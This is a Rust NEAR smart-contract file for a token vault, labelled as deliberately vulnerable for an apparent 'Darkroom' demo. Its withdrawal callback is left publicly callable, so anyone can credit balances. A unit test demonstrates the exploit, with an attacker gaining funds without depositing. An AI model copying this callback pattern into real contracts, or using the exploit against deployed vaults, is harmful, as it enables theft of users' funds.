//! Deliberately vulnerable. Do not reuse. The bug is the secret sold in the Darkroom demo.
use near_sdk::json_types::U128;
use near_sdk::store::LookupMap;
use near_sdk::{env, is_promise_success, near, require, AccountId, Gas, NearToken, PanicOnDefault, Promise};

#[near(contract_state)]
#[derive(PanicOnDefault)]
pub struct Vault {
    owner: AccountId,
    balances: LookupMap<AccountId, u128>,
}

#[near]
impl Vault {
    #[init]
    pub fn new(owner: AccountId) -> Self {
        Self { owner, balances: LookupMap::new(b"b") }
    }

    #[payable]
    pub fn deposit(&mut self) {
        let account = env::predecessor_account_id();
        *self.balances.entry(account).or_insert(0) += env::attached_deposit().as_yoctonear();
    }

    pub fn withdraw(&mut self, amount: U128) -> Promise {
        let account = env::predecessor_account_id();
        let balance = self.balances.get_mut(&account).expect("No balance");
        require!(*balance >= amount.0, "Insufficient balance");
        *balance -= amount.0;
        Promise::new(account.clone()).transfer(NearToken::from_yoctonear(amount.0)).then(
            Self::ext(env::current_account_id())
                .with_static_gas(Gas::from_tgas(5))
                .on_withdraw(account, amount),
        )
    }

    pub fn on_withdraw(&mut self, account: AccountId, amount: U128) {
        if !is_promise_success() {
            *self.balances.entry(account).or_insert(0) += amount.0;
        }
    }

    pub fn balance_of(&self, account: AccountId) -> U128 {
        U128(self.balances.get(&account).copied().unwrap_or(0))
    }

    pub fn owner(&self) -> AccountId {
        self.owner.clone()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use near_sdk::test_utils::VMContextBuilder;
    use near_sdk::{testing_env, PromiseResult};

    fn acct(name: &str) -> AccountId {
        name.parse().unwrap()
    }

    #[test]
    fn exploit_credits_the_attacker_with_no_deposit() {
        let mut vault = Vault::new(acct("owner"));
        testing_env!(
            VMContextBuilder::new().predecessor_account_id(acct("attacker")).current_account_id(acct("vault")).build(),
            near_sdk::test_vm_config(),
            near_sdk::RuntimeFeesConfig::test(),
            Default::default(),
            vec![PromiseResult::Failed]
        );
        vault.on_withdraw(acct("attacker"), U128(1_000));
        assert_eq!(vault.balance_of(acct("attacker")), U128(1_000));
    }
}
